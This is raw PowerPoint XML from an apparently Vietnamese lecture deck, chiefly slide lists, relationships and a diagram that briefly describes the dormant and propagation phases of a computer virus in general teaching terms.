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49.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5" r:id="rId1"/>
  </p:sldMasterIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId r:id="rId187"/>
  </p:notesMasterIdLst>
  <p:handoutMasterIdLst>
    <p:handoutMasterId r:id="rId188"/>
  </p:handoutMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="496" r:id="rId2"/>
    <p:sldId id="354" r:id="rId3"/>
    <p:sldId id="452" r:id="rId4"/>
    <p:sldId id="512" r:id="rId5"/>
    <p:sldId id="622" r:id="rId6"/>
    <p:sldId id="625" r:id="rId7"/>
    <p:sldId id="626" r:id="rId8"/>
    <p:sldId id="639" r:id="rId9"/>
    <p:sldId id="628" r:id="rId10"/>
    <p:sldId id="637" r:id="rId11"/>
    <p:sldId id="638" r:id="rId12"/>
    <p:sldId id="640" r:id="rId13"/>
    <p:sldId id="641" r:id="rId14"/>
    <p:sldId id="631" r:id="rId15"/>
    <p:sldId id="728" r:id="rId16"/>
    <p:sldId id="725" r:id="rId17"/>
    <p:sldId id="726" r:id="rId18"/>
    <p:sldId id="730" r:id="rId19"/>
    <p:sldId id="731" r:id="rId20"/>
    <p:sldId id="732" r:id="rId21"/>
    <p:sldId id="733" r:id="rId22"/>
    <p:sldId id="734" r:id="rId23"/>
    <p:sldId id="735" r:id="rId24"/>
    <p:sldId id="642" r:id="rId25"/>
    <p:sldId id="646" r:id="rId26"/>
    <p:sldId id="643" r:id="rId27"/>
    <p:sldId id="649" r:id="rId28"/>
    <p:sldId id="651" r:id="rId29"/>
    <p:sldId id="648" r:id="rId30"/>
    <p:sldId id="647" r:id="rId31"/>
    <p:sldId id="650" r:id="rId32"/>
    <p:sldId id="652" r:id="rId33"/>
    <p:sldId id="653" r:id="rId34"/>
    <p:sldId id="672" r:id="rId35"/>
    <p:sldId id="671" r:id="rId36"/>
    <p:sldId id="660" r:id="rId37"/>
    <p:sldId id="661" r:id="rId38"/>
    <p:sldId id="736" r:id="rId39"/>
    <p:sldId id="818" r:id="rId40"/>
    <p:sldId id="479" r:id="rId41"/>
    <p:sldId id="757" r:id="rId42"/>
    <p:sldId id="674" r:id="rId43"/>
    <p:sldId id="675" r:id="rId44"/>
    <p:sldId id="729" r:id="rId45"/>
    <p:sldId id="683" r:id="rId46"/>
    <p:sldId id="684" r:id="rId47"/>
    <p:sldId id="685" r:id="rId48"/>
    <p:sldId id="686" r:id="rId49"/>
    <p:sldId id="687" r:id="rId50"/>
    <p:sldId id="688" r:id="rId51"/>
    <p:sldId id="689" r:id="rId52"/>
    <p:sldId id="758" r:id="rId53"/>
    <p:sldId id="759" r:id="rId54"/>
    <p:sldId id="761" r:id="rId55"/>
    <p:sldId id="771" r:id="rId56"/>
    <p:sldId id="770" r:id="rId57"/>
    <p:sldId id="772" r:id="rId58"/>
    <p:sldId id="762" r:id="rId59"/>
    <p:sldId id="763" r:id="rId60"/>
    <p:sldId id="764" r:id="rId61"/>
    <p:sldId id="765" r:id="rId62"/>
    <p:sldId id="766" r:id="rId63"/>
    <p:sldId id="767" r:id="rId64"/>
    <p:sldId id="773" r:id="rId65"/>
    <p:sldId id="774" r:id="rId66"/>
    <p:sldId id="775" r:id="rId67"/>
    <p:sldId id="776" r:id="rId68"/>
    <p:sldId id="777" r:id="rId69"/>
    <p:sldId id="778" r:id="rId70"/>
    <p:sldId id="779" r:id="rId71"/>
    <p:sldId id="780" r:id="rId72"/>
    <p:sldId id="781" r:id="rId73"/>
    <p:sldId id="782" r:id="rId74"/>
    <p:sldId id="783" r:id="rId75"/>
    <p:sldId id="692" r:id="rId76"/>
    <p:sldId id="784" r:id="rId77"/>
    <p:sldId id="785" r:id="rId78"/>
    <p:sldId id="694" r:id="rId79"/>
    <p:sldId id="695" r:id="rId80"/>
    <p:sldId id="696" r:id="rId81"/>
    <p:sldId id="697" r:id="rId82"/>
    <p:sldId id="817" r:id="rId83"/>
    <p:sldId id="707" r:id="rId84"/>
    <p:sldId id="709" r:id="rId85"/>
    <p:sldId id="895" r:id="rId86"/>
    <p:sldId id="756" r:id="rId87"/>
    <p:sldId id="613" r:id="rId88"/>
    <p:sldId id="868" r:id="rId89"/>
    <p:sldId id="819" r:id="rId90"/>
    <p:sldId id="820" r:id="rId91"/>
    <p:sldId id="821" r:id="rId92"/>
    <p:sldId id="822" r:id="rId93"/>
    <p:sldId id="823" r:id="rId94"/>
    <p:sldId id="824" r:id="rId95"/>
    <p:sldId id="869" r:id="rId96"/>
    <p:sldId id="870" r:id="rId97"/>
    <p:sldId id="872" r:id="rId98"/>
    <p:sldId id="873" r:id="rId99"/>
    <p:sldId id="876" r:id="rId100"/>
    <p:sldId id="877" r:id="rId101"/>
    <p:sldId id="878" r:id="rId102"/>
    <p:sldId id="879" r:id="rId103"/>
    <p:sldId id="880" r:id="rId104"/>
    <p:sldId id="881" r:id="rId105"/>
    <p:sldId id="882" r:id="rId106"/>
    <p:sldId id="883" r:id="rId107"/>
    <p:sldId id="884" r:id="rId108"/>
    <p:sldId id="885" r:id="rId109"/>
    <p:sldId id="886" r:id="rId110"/>
    <p:sldId id="888" r:id="rId111"/>
    <p:sldId id="889" r:id="rId112"/>
    <p:sldId id="890" r:id="rId113"/>
    <p:sldId id="891" r:id="rId114"/>
    <p:sldId id="892" r:id="rId115"/>
    <p:sldId id="893" r:id="rId116"/>
    <p:sldId id="894" r:id="rId117"/>
    <p:sldId id="857" r:id="rId118"/>
    <p:sldId id="833" r:id="rId119"/>
    <p:sldId id="858" r:id="rId120"/>
    <p:sldId id="859" r:id="rId121"/>
    <p:sldId id="834" r:id="rId122"/>
    <p:sldId id="860" r:id="rId123"/>
    <p:sldId id="861" r:id="rId124"/>
    <p:sldId id="835" r:id="rId125"/>
    <p:sldId id="862" r:id="rId126"/>
    <p:sldId id="836" r:id="rId127"/>
    <p:sldId id="863" r:id="rId128"/>
    <p:sldId id="837" r:id="rId129"/>
    <p:sldId id="838" r:id="rId130"/>
    <p:sldId id="864" r:id="rId131"/>
    <p:sldId id="840" r:id="rId132"/>
    <p:sldId id="865" r:id="rId133"/>
    <p:sldId id="866" r:id="rId134"/>
    <p:sldId id="843" r:id="rId135"/>
    <p:sldId id="845" r:id="rId136"/>
    <p:sldId id="846" r:id="rId137"/>
    <p:sldId id="847" r:id="rId138"/>
    <p:sldId id="848" r:id="rId139"/>
    <p:sldId id="849" r:id="rId140"/>
    <p:sldId id="850" r:id="rId141"/>
    <p:sldId id="851" r:id="rId142"/>
    <p:sldId id="852" r:id="rId143"/>
    <p:sldId id="853" r:id="rId144"/>
    <p:sldId id="854" r:id="rId145"/>
    <p:sldId id="855" r:id="rId146"/>
    <p:sldId id="856" r:id="rId147"/>
    <p:sldId id="867" r:id="rId148"/>
    <p:sldId id="825" r:id="rId149"/>
    <p:sldId id="826" r:id="rId150"/>
    <p:sldId id="787" r:id="rId151"/>
    <p:sldId id="827" r:id="rId152"/>
    <p:sldId id="789" r:id="rId153"/>
    <p:sldId id="788" r:id="rId154"/>
    <p:sldId id="790" r:id="rId155"/>
    <p:sldId id="791" r:id="rId156"/>
    <p:sldId id="793" r:id="rId157"/>
    <p:sldId id="794" r:id="rId158"/>
    <p:sldId id="795" r:id="rId159"/>
    <p:sldId id="796" r:id="rId160"/>
    <p:sldId id="797" r:id="rId161"/>
    <p:sldId id="828" r:id="rId162"/>
    <p:sldId id="798" r:id="rId163"/>
    <p:sldId id="829" r:id="rId164"/>
    <p:sldId id="799" r:id="rId165"/>
    <p:sldId id="800" r:id="rId166"/>
    <p:sldId id="801" r:id="rId167"/>
    <p:sldId id="802" r:id="rId168"/>
    <p:sldId id="803" r:id="rId169"/>
    <p:sldId id="830" r:id="rId170"/>
    <p:sldId id="804" r:id="rId171"/>
    <p:sldId id="805" r:id="rId172"/>
    <p:sldId id="806" r:id="rId173"/>
    <p:sldId id="809" r:id="rId174"/>
    <p:sldId id="808" r:id="rId175"/>
    <p:sldId id="810" r:id="rId176"/>
    <p:sldId id="811" r:id="rId177"/>
    <p:sldId id="812" r:id="rId178"/>
    <p:sldId id="813" r:id="rId179"/>
    <p:sldId id="814" r:id="rId180"/>
    <p:sldId id="815" r:id="rId181"/>
    <p:sldId id="816" r:id="rId182"/>
    <p:sldId id="719" r:id="rId183"/>
    <p:sldId id="549" r:id="rId184"/>
    <p:sldId id="614" r:id="rId185"/>
    <p:sldId id="615" r:id="rId186"/>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99"/>
    <a:srgbClr val="CC0000"/>
    <a:srgbClr val="EBF840"/>
    <a:srgbClr val="800000"/>
    <a:srgbClr val="692A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504" autoAdjust="0"/>
    <p:restoredTop sz="73985" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr>
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="54" d="100"/>
          <a:sy n="54" d="100"/>
        </p:scale>
        <p:origin x="1278" y="48"/>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53" d="100"/>
          <a:sy n="53" d="100"/>
        </p:scale>
        <p:origin x="2850" y="7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slide" Target="slides/slide153.xml"/><Relationship Id="rId159" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide158.xml"/><Relationship Id="rId175" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide174.xml"/><Relationship Id="rId170" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide169.xml"/><Relationship Id="rId191" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme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slide" Target="slides/slide164.xml"/><Relationship Id="rId181" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide180.xml"/><Relationship Id="rId186" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide185.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slide" Target="slides/slide170.xml"/><Relationship Id="rId176" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide175.xml"/><Relationship Id="rId192" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tableStyles" Target="tableStyle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82" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide181.xml"/><Relationship Id="rId187"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172" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide17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presProps" Target="pres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0" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/viewProps" Target="view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s>
</file>

<file path=ppt/diagrams/colors1.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922977C-042A-4A29-BBE8-0624C4CF945D}" type="doc">
      <dgm:prSet loTypeId="urn:microsoft.com/office/officeart/2005/8/layout/vProcess5" loCatId="process" qsTypeId="urn:microsoft.com/office/officeart/2005/8/quickstyle/simple1" qsCatId="simple" csTypeId="urn:microsoft.com/office/officeart/2005/8/colors/accent2_1" csCatId="accent2" phldr="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7FADB00A-7145-40DD-9A34-B16AA92F9DB6}">
      <dgm:prSet phldrT="[Text]" custT="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Dormant (</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>ngủ</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>đông</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>)</a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" sz="1800" b="1" dirty="0">
            <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{FBB692A2-E201-441D-808C-C84EB60A09BC}" type="parTrans" cxnId="{C02A48AB-A351-4ED4-8E9A-D8366FDE4FE8}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{291061E3-6E32-4304-973C-391E85FF1E06}" type="sibTrans" cxnId="{C02A48AB-A351-4ED4-8E9A-D8366FDE4FE8}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{31917318-B128-4E78-BF01-E73D3B4CD690}">
      <dgm:prSet phldrT="[Text]" custT="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr algn="just"/>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>ở </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>trạng</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>thái</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>chờ</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="vi-VN" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>để</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="vi-VN" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> được kích hoạt bởi một số sự kiện. Không phải tất cả các virus đều có giai đoạn này.</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5328DBB3-6A55-4C4E-9DEE-9014D1AEA628}" type="parTrans" cxnId="{B9DB048C-488C-4234-90F9-D86A19A88434}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{94F2CF56-0B34-469D-9FC8-4C7C4B993C83}" type="sibTrans" cxnId="{B9DB048C-488C-4234-90F9-D86A19A88434}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{85E1035C-E9B2-4067-A024-5CC3D15FBAC0}">
      <dgm:prSet phldrT="[Text]" custT="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>Propagation (</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>lan</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>truyền</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>)</a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" sz="1800" b="1" dirty="0">
            <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{01E2DE21-8ABA-4AC6-9358-E12C3FE348AB}" type="parTrans" cxnId="{3B10071F-2C33-4466-815F-E5950422F6FB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{88DFE316-93D9-4FDE-8D2B-B43ED6F53C87}" type="sibTrans" cxnId="{3B10071F-2C33-4466-815F-E5950422F6FB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1F017BCC-62A3-45E6-90B8-63A6CE3C890E}">
      <dgm:prSet phldrT="[Text]" custT="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:pPr algn="just"/>
          <a:r>
            <a:rPr lang="vi-VN" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>đặt một bản sao</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="vi-VN" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>của chính nó vào các chương trình</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>khác</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="vi-VN" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> hoặc một số khu vực hệ thống trên đĩa. Mỗi chương trình bị nhiễm sẽ chứa một bản sao của virus</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>và</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>tiếp</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>tục</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>vào</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>giai</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>đoạn</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>lan</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t> </a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0" err="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:rPr>
            <a:t>truyền</a:t>
          </a:r>
          <a:endParaRPr lang="vi-VN" sz="1800" i="1" dirty="0">
            <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9F87E8F0-7F7F-4BE9-A9D2-61A3EEC4F63C}" type="parTrans" cxnId="{8808CFA5-8880-400F-B840-82A0C3CD94A6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{BFF52792-87CD-4FA6-9E54-76FA7E08CDB1}" type="sibTrans" cxnId="{8808CFA5-8880-400F-B840-82A0C3CD94A6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="vi-VN"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{A8475870-B85D-4EBD-B06D-C4D263630505}">
      <dgm:prSet phldrT="[Text]" custT="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" sz="1800" i="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
